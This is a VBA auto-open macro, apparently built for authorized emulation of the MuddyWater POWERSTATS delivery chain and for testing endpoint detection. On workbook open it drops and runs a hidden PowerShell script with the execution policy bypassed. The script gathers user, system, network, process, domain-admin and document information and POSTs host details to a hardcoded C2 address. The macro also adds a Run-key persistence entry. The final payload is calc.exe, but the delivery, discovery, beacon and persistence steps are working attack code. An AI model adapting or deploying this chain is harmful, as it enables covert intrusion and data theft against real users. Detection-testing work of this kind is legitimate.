' ============================================================================
' ESINTA EMULATION -- AUTHORIZED SECURITY TESTING ONLY
'
' MuddyCalc Stage 1 -- Workbook_Open Macro
' Emulates: MuddyWater macro delivery (CISA AA22-055A)
' MITRE: T1204.002 (User Execution), T1059.005 (VBScript)
'
' Final payload: calc.exe (safe, benign)
' C2: Local network only (hardcoded private IP: 192.168.0.148)
' ============================================================================

Sub Workbook_Open()
    Dim wsh As Object
    Dim tempDir As String
    Dim vbsPath As String
    Dim ps1Path As String
    Dim fileNum As Integer
    Dim q As String

    ' q = double-quote character for building strings with quotes
    q = Chr(34)

    Set wsh = CreateObject("WScript.Shell")
    tempDir = wsh.ExpandEnvironmentStrings("%TEMP%")
    vbsPath = tempDir & "\update_check.vbs"
    ps1Path = tempDir & "\update_check.ps1"

    ' --- Drop PowerShell script to %TEMP% (T1059.001) ---
    fileNum = FreeFile
    Open ps1Path For Output As #fileNum
    Print #fileNum, "# ============================================================================"
    Print #fileNum, "# ESINTA EMULATION -- AUTHORIZED SECURITY TESTING ONLY"
    Print #fileNum, "#"
    Print #fileNum, "# This code replicates documented malware behavior for defensive security"
    Print #fileNum, "# testing and endpoint telemetry validation. It does NOT contain real malware"
    Print #fileNum, "# payloads, exploits, or evasion techniques."
    Print #fileNum, "#"
    Print #fileNum, "# LEGAL: Only run this in environments you own or have explicit written"
    Print #fileNum, "# authorization to test. Unauthorized use may violate computer fraud laws."
    Print #fileNum, "#"
    Print #fileNum, "# Final payload: calc.exe (safe, benign)"
    Print #fileNum, "# C2: Local network only (hardcoded private IP: 192.168.0.148)"
    Print #fileNum, "# ============================================================================"
    Print #fileNum, "#"
    Print #fileNum, "# MuddyCalc Stage 3 -- POWERSTATS Backdoor Emulation"
    Print #fileNum, "# Emulates: MuddyWater POWERSTATS v1/v3 (CISA AA22-055A, MITRE S0223)"
    Print #fileNum, "#"
    Print #fileNum, "# Real POWERSTATS is a PowerShell-based first-stage backdoor used by"
    Print #fileNum, "# MuddyWater since at least 2017. It collects system information and"
    Print #fileNum, "# sends it to C2, then executes commands received from C2."
    Print #fileNum, "#"
    Print #fileNum, "# We emulate the discovery + beacon phase. The " & q & "command" & q & " from C2 is"
    Print #fileNum, "# always calc.exe (safe payload)."
    Print #fileNum, "#"
    Print #fileNum, "# MITRE ATT&CK:"
    Print #fileNum, "#   T1059.001 -- Command and Scripting Interpreter: PowerShell"
    Print #fileNum, "#   T1497.003 -- Virtualization/Sandbox Evasion: Time Based"
    Print #fileNum, "#   T1033     -- System Owner/User Discovery"
    Print #fileNum, "#   T1082     -- System Information Discovery"
    Print #fileNum, "#   T1016     -- System Network Configuration Discovery"
    Print #fileNum, "#   T1057     -- Process Discovery"
    Print #fileNum, "#   T1069.002 -- Permission Groups Discovery: Domain Groups"
    Print #fileNum, "#   T1083     -- File and Directory Discovery"
    Print #fileNum, "#   T1071.001 -- Application Layer Protocol: Web Protocols"
    Print #fileNum, "# ============================================================================"
    Print #fileNum, ""
    Print #fileNum, "# --- Anti-analysis delay (T1497.003) ---"
    Print #fileNum, "# Real POWERSTATS checks for sandbox artifacts via WMI queries"
    Print #fileNum, "# (e.g., Win32_ComputerSystem model contains " & q & "virtual" & q & ", MAC address"
    Print #fileNum, "# prefixes for common hypervisors). We simplify to a timed delay."
    Print #fileNum, "Start-Sleep -Seconds 3"
    Print #fileNum, ""
    Print #fileNum, "# --- Discovery burst ---"
    Print #fileNum, "# Real POWERSTATS collects system information and sends it to C2 before"
    Print #fileNum, "# receiving commands. Each command below spawns as a cmd.exe child process"
    Print #fileNum, "# to maximize telemetry visibility for endpoint detection tools."
    Print #fileNum, ""
    Print #fileNum, "$discoveryResults = @{}"
    Print #fileNum, ""
    Print #fileNum, "# T1033 -- System Owner/User Discovery"
    Print #fileNum, "# MuddyWater collects the current username to identify high-value targets"
    Print #fileNum, "$discoveryResults[" & q & "whoami" & q & "] = (cmd.exe /c whoami 2>&1) | Out-String"
    Print #fileNum, ""
    Print #fileNum, "# T1082 -- System Information Discovery"
    Print #fileNum, "# POWERSTATS collects OS version, architecture, domain membership"
    Print #fileNum, "$discoveryResults[" & q & "systeminfo" & q & "] = (cmd.exe /c systeminfo 2>&1) | Out-String"
    Print #fileNum, ""
    Print #fileNum, "# T1016 -- System Network Configuration Discovery"
    Print #fileNum, "# Network adapter info helps MuddyWater map the target environment"
    Print #fileNum, "$discoveryResults[" & q & "ipconfig" & q & "] = (cmd.exe /c " & q & "ipconfig /all" & q & " 2>&1) | Out-String"
    Print #fileNum, ""
    Print #fileNum, "# T1057 -- Process Discovery"
    Print #fileNum, "# Running process list used to identify security tools (AV, EDR)"
    Print #fileNum, "$discoveryResults[" & q & "tasklist" & q & "] = (cmd.exe /c tasklist 2>&1) | Out-String"
    Print #fileNum, ""
    Print #fileNum, "# T1069.002 -- Permission Groups Discovery: Domain Groups"
    Print #fileNum, "# MuddyWater targets domain admin accounts for lateral movement"
    Print #fileNum, "$discoveryResults[" & q & "domain_admins" & q & "] = (cmd.exe /c 'net group " & q & "Domain Admins" & q & " /domain' 2>&1) | Out-String"
    Print #fileNum, ""
    Print #fileNum, "# T1083 -- File and Directory Discovery"
    Print #fileNum, "# Document enumeration for data staging / exfiltration targets"
    Print #fileNum, "$discoveryResults[" & q & "documents" & q & "] = (cmd.exe /c " & q & "dir %USERPROFILE%\Documents" & q & " 2>&1) | Out-String"
    Print #fileNum, ""
    Print #fileNum, "# --- C2 Beacon (T1071.001 -- Application Layer Protocol: Web) ---"
    Print #fileNum, "# Real POWERSTATS beacons to compromised web servers or cloud storage"
    Print #fileNum, "# (OneDrive, Sharepoint). We beacon to a local HTTP server."
    Print #fileNum, "$C2_URL = " & q & "http://192.168.0.148:8888/beacon" & q & ""
    Print #fileNum, ""
    Print #fileNum, "$beacon = @{"
    Print #fileNum, "    hostname  = $env:COMPUTERNAME"
    Print #fileNum, "    username  = $env:USERNAME"
    Print #fileNum, "    pid       = $PID"
    Print #fileNum, "    stage     = " & q & "powerstats_complete" & q & ""
    Print #fileNum, "    discovery = @{"
    Print #fileNum, "        whoami = ($discoveryResults[" & q & "whoami" & q & "]).Trim()"
    Print #fileNum, "        ip     = (Get-NetIPAddress -AddressFamily IPv4 |"
    Print #fileNum, "                  Where-Object { $_.IPAddress -ne " & q & "127.0.0.1" & q & " } |"
    Print #fileNum, "                  Select-Object -First 1).IPAddress"
    Print #fileNum, "    }"
    Print #fileNum, "} | ConvertTo-Json -Depth 3"
    Print #fileNum, ""
    Print #fileNum, "try {"
    Print #fileNum, "    Invoke-WebRequest -Uri $C2_URL -Method POST -Body $beacon `"
    Print #fileNum, "        -ContentType " & q & "application/json" & q & " -UseBasicParsing `"
    Print #fileNum, "        -ErrorAction SilentlyContinue"
    Print #fileNum, "} catch {"
    Print #fileNum, "    # Beacon failure is non-fatal -- continue to payload"
    Print #fileNum, "    # In real POWERSTATS, C2 failure triggers retry with backoff"
    Print #fileNum, "}"
    Print #fileNum, ""
    Print #fileNum, "# --- Final payload (SAFE) ---"
    Print #fileNum, "# In real POWERSTATS, C2 sends arbitrary commands via .cmd files or"
    Print #fileNum, "# encoded PowerShell scripts. The operator typically deploys additional"
    Print #fileNum, "# tools (Mimikatz, LaZagne, credential dumpers) at this stage."
    Print #fileNum, "#"
    Print #fileNum, "# We launch calc.exe as a safe, visible indicator of successful execution."
    Print #fileNum, "Start-Process " & q & "calc.exe" & q & ""
    Close #fileNum

    ' --- Registry persistence (T1547.001) - SAFE: value is calc.exe ---
    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateCheck", "calc.exe", "REG_SZ"

    ' --- Drop VBScript to %TEMP% (T1059.005) ---
    ' One-line VBS: inline CreateObject, no Set/variables
    fileNum = FreeFile
    Open vbsPath For Output As #fileNum
    Print #fileNum, "CreateObject(" & q & "WScript.Shell" & q & ").Run " & q & "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %TEMP%\update_check.ps1" & q & ", 0"
    Close #fileNum

    ' --- Execute dropped VBScript (T1059.005) ---
    wsh.Run "wscript.exe " & q & vbsPath & q, 0, False

    Set wsh = Nothing
End Sub
